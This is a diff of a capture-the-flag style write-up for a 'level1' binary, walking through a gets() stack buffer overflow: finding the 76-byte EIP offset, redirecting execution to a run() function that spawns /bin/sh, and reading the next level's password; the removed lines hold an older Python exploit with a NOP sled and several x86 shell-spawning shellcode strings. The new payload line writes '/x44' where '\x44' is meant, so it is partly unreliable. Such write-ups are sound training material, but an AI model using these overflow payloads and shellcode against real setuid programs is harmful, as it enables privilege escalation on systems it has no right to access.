@@ -1,48 +1,49 @@
-We can see a binary called level1 in the home
+We can see a binary named ./level1 with the level2 rights
 
-After an execution of this, we can see that it's waiting for an entry, then nothing
-after an enter pressed.
+After a "disas main" in gdb we can see there's a gets.
+After a "info function" we can see another function next to main, called run
 
-Let's open it with gdb.
+If we disas run we can see that run opperate a system("/bin/sh")
+We can verify it if we break in main, and write "call run()"
+It will open a sh, but unfortunately we havnt the EUID rights due to GDB...
 
-gets is reputed for its bufferoverflow security exploit.
+Let's proceed a bufferoverflow and put a jump to run, at the EIP address
 
-Let's try a bufferoverflow and override EIP which is the register which handle
-the next instruction to execute to a shellcode which will help us to execute
-a sh.
+We can use this website to generate and calculate our bufferoverflow
+
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+Lets generate a 100char buffer to check where EIP is located.
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+put the code in a file and pipe it in the program, started with GDB.
+
+It returns 0x63413563, the value of eip when it segfault
+With the website, we put it and it will return the lenght of the bufferoverflow
+
+The lenght is 76
+
+Se now we must create a 76B string and add it the realtive address of run() in order
+to override the value of the saved EIP.
+
+To get the relative address of run() you must get the address of run() by 
+"info functions run"
+The address of run is : 0x08048444
+
+Reversed : 0x44840408
+
+python : 
+("\x90" * 76) + "/x44/x84/x04/x08"
+
+put the result in a file and use the result of cat to pipe level1
+
+python exploit > pad
+
+cat /tmp/pad - | ./level1
+
+dont forget the " - " for the bash access
+
+Now you are can "cd .." then "cd ./level2" and "cat .pass"
 
 
- 1 : create the exploit printer
-
-#!/usr/bin/python
-pad = "\x41" * (92 - 4 * 4)
-eip = "\x10\xf7\xff\xbf"
-shellcode = (SHELLCODE)
-NOP = "\x90" * 100
-print pad + eip + NOP + shellcode
-
-help to understand : 
-put a breakpoint in the leave address, just after the gets functions.
-Execute the program in GDB with :
-run < <(python /tmp/exploit)
-
-This exploit will write A until the EIP address.
-We must override the EIP address with the direct following address of the location of EIP.
-The next instruction which will be read will be the NOP then the shellcode.
-
-HELP :
-At this moment, you can execute the commend : x/100xw to see the current overwrite stack.
-You can also try to run without any argument, to see the difference.
-
-
-
-
-
-TMP : 
-shellcodes trouvés 
-shellcode2 = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-#shellcode = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
-#shellcode = "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
-shellcode = "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-#shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
-#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
